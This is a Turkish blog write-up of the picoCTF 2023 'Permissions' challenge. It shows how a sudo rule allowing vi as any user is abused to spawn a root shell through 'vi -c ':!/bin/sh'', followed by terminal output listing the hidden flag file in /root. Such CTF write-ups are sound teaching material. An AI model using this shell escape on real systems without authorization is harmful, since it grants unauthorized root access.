---
title: 'picoCTF 2023 | Permissions WriteUp'
author: appdone
categories: [picoCTF 2023 Challenges]
tags: [sudo]
render_with_liquid: false
---

Bu yazımda, picoCTF platformunda yer alan "Permissions" isimli meydan okumayı çözeceğiz. Amacımız picoCTF tarafından sağlanan linux sistemde yetki yükselterek /root dizininden bayrağı almaktır.

```console
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$
```

Sisteme bağlandıktan sonra ilk iş "sudo -l" komutunu kullandım ve vi aracını istediğim kullanıcının yetkisiyle çalıştırabileceğimi gördüm. -c parametresi ile seçilen programlama dilini kullanarak komut çalıştırabileceğimi biliyorum.

```
sudo -u root /usr/bin/vi -c ':!/bin/sh'
```

Komutu çalıştırdığımızda root haklarına sahip oluyoruz. Geriye sadece root dizinindeki bayrağı almak kalıyor. O da başına '.' konarak gizlenmiş. -a parametresini kullanarak görüntüleyebiliyoruz.

```console
picoplayer@challenge:~$ sudo -l
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo -u root /usr/bin/vi -c ':!/bin/sh'
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Mar 14 21:47 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
```
